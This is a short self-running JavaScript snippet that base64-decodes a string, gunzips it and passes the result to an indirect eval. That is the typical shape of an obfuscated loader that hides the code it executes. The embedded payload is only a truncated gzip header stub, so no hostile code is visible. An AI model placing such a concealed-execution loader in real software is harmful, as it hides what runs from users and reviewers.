(async function(){
  const bin=Uint8Array.from(atob("H4sIAAAA"),c=>c.charCodeAt(0));
  const ds=new DecompressionStream("gzip");
  const stream=new Response(bin).body.pipeThrough(ds);
  const text=await new Response(stream).text();
  (0,eval)(text);
})();
